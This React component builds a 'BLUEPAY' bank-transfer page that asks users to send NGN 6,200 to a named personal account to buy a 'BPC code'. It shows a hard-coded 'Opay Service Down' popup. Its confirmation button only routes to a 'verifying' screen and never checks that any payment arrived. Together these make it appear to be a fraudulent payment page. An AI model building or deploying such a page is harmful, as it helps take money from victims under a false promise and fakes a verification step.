import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { ArrowLeft, Copy } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";

const BuyBPCPayment = () => {
  const navigate = useNavigate();
  const [showOpayAlert, setShowOpayAlert] = useState(true);

  const handleCopy = (text: string, type: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        description: `${type} copied to clipboard!`,
        duration: 2000,
      });
    });
  };

  const handlePaymentConfirm = () => {
    navigate("/buy-bpc/verifying");
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-100 relative">
      {/* OPay Alert Popup */}
      {showOpayAlert && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg shadow-lg p-6 max-w-md w-full mx-4 text-center">
            <div className="flex flex-col items-center">
              <img
                src="https://i.ibb.co/qLVCfHVK/icon.jpg"
                alt="Opay Logo"
                className="w-12 h-12 mb-3"
              />
              <h2 className="text-red-600 text-xl font-bold mb-2">
                Opay Service Down
              </h2>
              <p className="text-gray-700 mb-2">
                Please do not use Opay bank for payments at this time.
              </p>
              <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mb-4 text-sm">
                The Opay bank service is currently experiencing issues. Please
                use other supported banks for your payment.
              </div>
              <Button
                className="bg-blue-600 hover:bg-blue-700 w-full py-2 text-white"
                onClick={() => setShowOpayAlert(false)}
              >
                I Understand
              </Button>
            </div>
          </div>
        </div>
      )}

      <header className="bg-[#222222] text-white py-4 px-5 flex justify-between items-center sticky top-0 z-10">
        <button className="text-xl">
          <span className="sr-only">Menu</span>
        </button>
        <h1 className="text-2xl font-semibold">BLUEPAY</h1>
        <div className="w-8 h-8">
          <span className="sr-only">Notifications</span>
        </div>
      </header>

      <div className="bg-gray-200 py-4 px-5 flex items-center justify-between">
        <div className="flex items-center">
          <button onClick={() => navigate(-1)} className="mr-3">
            <ArrowLeft size={24} />
          </button>
          <h2 className="text-xl font-bold">Bank Transfer</h2>
        </div>
        <button
          onClick={() => navigate(-1)}
          className="text-red-500 font-medium"
        >
          Cancel
        </button>
      </div>

      <div className="flex flex-col items-center p-6 mb-6">
        <h1 className="text-4xl font-bold mb-2">NGN 6,200</h1>
        <p className="text-gray-600">BPC Code Purchase</p>
      </div>

      <div className="bg-blue-50 mx-5 p-5 rounded-lg">
        <h3 className="text-blue-700 text-lg font-semibold mb-2">
          Instructions:
        </h3>
        <ol className="list-decimal pl-5 text-blue-700 space-y-3">
          <li>Copy the account details below</li>
          <li>Open your bank app and make a transfer</li>
          <li>Return here and click "I have made this bank Transfer"</li>
          <li>Wait for confirmation (usually within 3 minutes)</li>
        </ol>
      </div>

      <div className="bg-white m-5 p-5 rounded-lg border border-gray-200">
        <div className="mb-4">
          <p className="text-gray-500 text-sm">Amount</p>
          <div className="flex justify-between items-center">
            <p className="text-2xl font-bold">NGN 6200</p>
            <Button
              variant="default"
              className="bg-blue-600 hover:bg-blue-700 flex items-center gap-2"
              onClick={() => handleCopy("6200", "Amount")}
            >
              <Copy size={18} />
              Copy
            </Button>
          </div>
        </div>

        <div className="mb-4 border-t pt-4">
          <p className="text-gray-500 text-sm">Account Number</p>
          <div className="flex justify-between items-center">
            <p className="text-2xl font-bold">1035319866</p>
            <Button
              variant="default"
              className="bg-blue-600 hover:bg-blue-700 flex items-center gap-2"
              onClick={() => handleCopy("1035319866", "Account Number")}
            >
              <Copy size={18} />
              Copy
            </Button>
          </div>
        </div>

        <div className="mb-4 border-t pt-4">
          <p className="text-gray-500 text-sm">Bank Name</p>
          <p className="text-2xl font-bold">CARBON</p>
        </div>

        <div className="mb-4 border-t pt-4">
          <p className="text-gray-500 text-sm">Account Name</p>
          <p className="text-2xl font-bold">SUNDAY CHINEMEREM</p>
        </div>
      </div>

      <p className="text-center px-5 mb-4 text-gray-700">
        Pay to this specific account and get your BPC code
      </p>

      <div className="px-5 mb-8">
        <Button
          className="bg-blue-600 hover:bg-blue-700 w-full py-6 text-lg font-semibold"
          onClick={handlePaymentConfirm}
        >
          I have made this bank Transfer
        </Button>
      </div>
    </div>
  );
};

export default BuyBPCPayment;
